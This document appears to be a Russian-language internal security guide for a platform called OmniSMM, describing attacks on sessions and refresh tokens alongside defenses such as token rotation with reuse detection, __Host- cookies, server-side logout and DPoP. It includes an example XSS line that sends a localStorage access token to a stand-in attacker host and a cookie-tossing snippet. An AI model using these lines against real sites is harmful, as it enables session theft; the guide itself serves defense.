# Доскональное руководство по защите от кражи сессий и атак на Refresh-токены (Session Hijacking & Token Theft Defense)

Настоящее руководство детально описывает векторы атак на механизмы аутентификации, сессионные куки и протоколы ротации Refresh-токенов в современных веб-приложениях (Next.js 16 App Router / Node.js), а также архитектурные барьеры платформы OmniSMM 1.0.

## 2. Детальный разбор векторов атак

### 2.1. Атака 1: Refresh Token Replay & Гонка ротации (Token Rotation Race)

#### Механика эксплойта:
1. **Отсутствие ротации (Static Refresh Token):**
   - Если сервер выдает Refresh Token со сроком жизни 30 дней и при каждом обновлении выдает только новый Access Token, перехваченный злоумышленником Refresh Token дает ему **пожизненный невидимый доступ** к аккаунту жертвы.
2. **Наивная ротация без детекции повторного использования:**
   - Сервер при каждом `/api/auth/refresh` выдает новую пару `(access, refresh)` и удаляет старый.
   - Злоумышленник перехватывает старый Refresh Token $R_1$. Легитимный клиент использует $R_1$ и получает $R_2$.
   - Если сервер просто возвращает `Invalid token` на попытку злоумышленника применить $R_1$, атака остается незамеченной, а злоумышленник может перехватить следующий $R_2$.

#### Золотой стандарт защиты: Refresh Token Rotation (RTR) с каскадной инвалидацией (RFC 6749 Section 10.4, RFC 6819 Section 5.2.2.3):
- **Связывание в цепочку (Token Family):** Каждый токен принадлежит семейству (`family_id`). При ротации $R_1 \to R_2 \to R_3$ сервер хранит историю погашенных токенов в Redis.
- **Automatic Reuse Detection:** Если сервер получает запрос с **УЖЕ ИСПОЛЬЗОВАННЫМ** токеном ($R_1$ после выпуска $R_2$), это однозначный маркер компрометации (утечка произошла либо у клиента, либо по сети).
- **Каскадный отзыв (Family Invalidation Cascade):** Сервер мгновенно аннулирует **ВСЕ** токены семейства (`family_id`), уничтожает активную сессию в Redis/БД и разлогинивает все устройства пользователя.

#### Проблема «Шторма вкладок» (Multi-Tab Race Condition) и ее решение:
- *Проблема:* Пользователь открывает 5 вкладок сайта. При истечении Access-токена все 5 вкладок параллельно вызывают `/api/auth/refresh` с одним и тем же токеном $R_1$. Первая вкладка успевает и получает $R_2$, а остальные 4 вкладки приходят со старым $R_1$. При наивной реализации сервер считает это атакой взломщика и выбивает честного пользователя из аккаунта!
- *Решение (Grace Period / Leeway Window в Redis):*
  При успешной ротации $R_1 \to R_2$ старый токен $R_1$ помечается в Redis временным ключом с TTL 10–15 секунд:
  ```typescript
  // Сохраняем результат ротации на 15 секунд для параллельных вкладок
  await redis.setex(`refresh_grace:${hash(R1)}`, 15, JSON.stringify({
    accessToken: newAccessToken,
    refreshToken: R2
  }));
  ```
  Если в течение 15 секунд приходит запрос с $R_1$, сервер возвращает УЖЕ ВЫПУЩЕННУЮ пару $R_2$, не генерируя новый токен и не инициируя панику компрометации. Запросы с $R_1$ по истечении 15 секунд вызывают немедленный каскадный отзыв всей сессии.

### 2.2. Атака 2: Cookie Tossing и Session Injection через поддомены

#### Механика эксплойта:
- В крупных проектах часто присутствуют поддомены: `api.smmplan.pro`, `dev.smmplan.pro`, `staging.smmplan.pro`, `blog.smmplan.pro`.
- Если один из поддоменов уязвим к XSS или заброшен (Dangling CNAME / Subdomain Takeover), злоумышленник внедряет скрипт, который выполняет:
  ```javascript
  // Установка куки для родительского домена
  document.cookie = "session_token=ATTACKER_SESSION; Domain=.smmplan.pro; Path=/";
  ```
- Когда пользователь заходит на основной защищенный домен `https://smmplan.pro`, браузер передает **две** куки `session_token`. Из-за специфики спецификации браузер часто отдает куку злоумышленника первой.
- В результате пользователь оказывается авторизован под сессией злоумышленника (Session Fixation). Пользователь пополняет баланс, оформляет заказы, а злоумышленник видит все действия и тратит его средства.

#### Защитный контур: Префикс `__Host-` (RFC 6265bis):
Браузеры поддерживают защитные префиксы кук:
- Кука с именем `__Host-session_token`:
  1. **ОБЯЗАНА** иметь флаг `Secure` (передача только по HTTPS).
  2. **ОБЯЗАНА** иметь `Path=/`.
  3. **ЗАПРЕЩЕНО** указывать атрибут `Domain` (кука привязывается **СТРОГО к текущему хосту** `smmplan.pro` и не может быть перезаписана никаким поддоменом `dev.smmplan.pro`!).
```typescript
cookieStore.set('__Host-session_token', sessionToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  path: '/',
  // domain НЕ указывается!
});
```

### 2.3. Атака 3: XSS и кража токенов из LocalStorage / SessionStorage

#### Механика эксплойта:
- Распространенный антипаттерн SPA: сохранение JWT-токенов в `localStorage` или `sessionStorage`.
- Любая XSS-уязвимость (например, через Markdown в описании тикета поддержки, имя профиля, кастомное поле заказа или уязвимый npm-пакет в зависимостях фронтенда) позволяет злоумышленнику выполнить одну строчку:
  ```javascript
  fetch('https://attacker.evil/exfil?t=' + localStorage.getItem('access_token'));
  ```
- Злоумышленник мгновенно клонирует сессию без ведома пользователя.

#### Защитный контур OmniSMM:
- **Zero-Local-Storage-Tokens Invariant:** Ни один токен авторизации или идентификатор сессии **КАТЕГОРИЧЕСКИ НЕ ХРАНИТСЯ** в `localStorage` / `sessionStorage`.
- Все токены хранятся исключительно в `HttpOnly` куках, недоступных для чтения через `document.cookie` из JavaScript.
- **Strict Content-Security-Policy (CSP):** Запрет выполнения сторонних скриптов, использование криптографического Nonce для инлайн-скриптов.

### 2.4. Атака 4: Зомби-сессии (Zombie Sessions) при поверхностном Logout

#### Механика эксплойта:
- При нажатии кнопки «Выйти» клиентское приложение удаляет куку в браузере (`cookieStore.delete('session_token')`).
- На сервере токен сессии (JWT) остается валидным до истечения срока (например, еще 23 часа).
- Если злоумышленник перехватил этот токен до логаута (через сетевой сниффинг, логи прокси или вредоносное расширение), он может продолжать отправлять запросы с этим токеном. Токен превращается в «зомби».

#### Защитный контур платформы:
- **Двухуровневый Session Registry (БД + Redis Blacklist):**
  - Каждая сессия имеет уникальный `sessionId` и `sessionVer` (версию сессии).
  - При логауте вызывается серверный метод `logoutAction`:
    ```typescript
    // 1. Помечаем в БД
    await db.session.delete({ where: { id: sessionId } });
    
    // 2. Мгновенная инвалидация в Redis (TTL = остаток жизни токена)
    await redis.setex(`blacklist:session:${sessionId}`, 86400, 'revoked');
    
    // 3. Удаление куки
    cookieStore.delete('__Host-session_token');
    ```
  - При смене пароля или сбросе доступа: вызывается `revokeAllUserSessions(userId)`, удаляющий все активные сессии пользователя и инкрементирующий `user.tokenVersion`.

### 2.5. Атака 5: DPoP Bypass & Перехват на промежуточных прокси (Proxy Sidejacking)

#### Механика эксплойта:
- Обычные Bearer-токены обладают фатальным недостатком: любой, кто владеет строкой токена, обладает правами владельца.
- Если токен логируется на корпоративном прокси-сервере, балансировщике нагрузки или в туннеле, персонал провайдера или злоумышленник с доступом к логам может использовать токен со своего компьютера.

#### Защитный контур: DPoP (RFC 9449 — Demonstrating Proof-of-Possession):
- Для критических B2B API-клиентов и административных сессий платформа использует криптографическую привязку владения (DPoP):
  1. Клиент генерирует приватный ключ в браузере через `window.crypto.subtle.generateKey` (алгоритм ECDSA P-256).
  2. При каждом запросе клиент подписывает мини-JWT (DPoP Proof), содержащий:
     - `htm`: HTTP-метод (`POST`);
     - `htu`: URL запроса (`https://smmplan.pro/api/order/create`);
     - `iat`: временную метку (действительна $\le 30$ секунд);
     - `jti`: уникальный ID для защиты от повторов.
  3. Сервер сверяет подпись DPoP с публичным ключом, привязанным к токену.
  4. **Результат:** Даже если злоумышленник перехватил сам токен, он **НЕ МОЖЕТ** выполнить ни одного запроса без закрытого ключа, находящегося в защищенной памяти браузера жертвы!

### 2.6. Атака 6: Географический прыжок и скачки ASN (Impossible Travel)

#### Механика эксплойта:
- Пользователь авторизуется из Москвы (IP провайдера МТС/Ростелеком, ASN 12389, Chrome Windows).
- Спустя 20 секунд с тем же сессионным токеном приходит запрос на списание баланса из дата-центра във Франкфурте (IP DigitalOcean / Hetzner, ASN 14061, скрипт curl / Python).
- В классических системах запрос выполняется успешно, так как JWT криптографически валиден.

#### Защитный контур платформы:
- **Контекстная телеметрия сессии:** При создании сессии в БД сохраняются `ipAddress`, `userAgent`, `fingerprintHash` и контур (`contour`).
- **Детекция аномалий (Risk-Based Step-Up):**
  - При резкой смене подсети `/16` или страны за физически невозможное время (скорость перемещения $> 1000$ км/ч) сессия временно переводится в статус `SUSPENDED_CHALLENGE`.
  - Требуется подтверждение одноразовым кодом из Telegram-бота или Magic Link на подтвержденный email.
  - Запросы с IP дата-центров (VPN/Hosting ASN) к административным операциям блокируются автоматически.

## 3. Сводный чек-лист неуязвимости сессий платформы

| Аспект безопасности | Архитектурный стандарт OmniSMM | Устраняемая угроза |
| :--- | :--- | :--- |
| **Имя и флаги куки** | `__Host-session_token`, `HttpOnly`, `Secure`, `SameSite=Lax`, `Path=/` | XSS кража, Cookie Tossing с поддоменов, MITM перехват |
| **Хранилище на клиенте** | **СТРОГО** HttpOnly Cookie (0 токенов в localStorage) | Тотальная кража сессий при DOM XSS |
| **Ротация Refresh-токенов** | RTR с Token Family + Grace Period 15s в Redis | Пожизненный доступ по украденному токену, Multi-Tab гонки |
| **Детекция компрометации** | Немедленный сброс всей семьи токенов при повторном вводе | Использование утекших или дублированных токенов |
| **Серверный логаут** | Удаление из БД + внесение `sessionId` в Redis Blacklist | Зомби-сессии (продолжение жизни JWT после логаута) |
| **Крипто-привязка (API)** | DPoP (RFC 9449) с ключами WebCrypto ECDSA P-256 | Использование Bearer-токенов при утечке из сетевых логов |
| **Поведение при смене пароля** | Инкремент `user.tokenVersion` + вызов `revokeAllUserSessions` | Сохранение доступа взломщика после смены пароля жертвой |
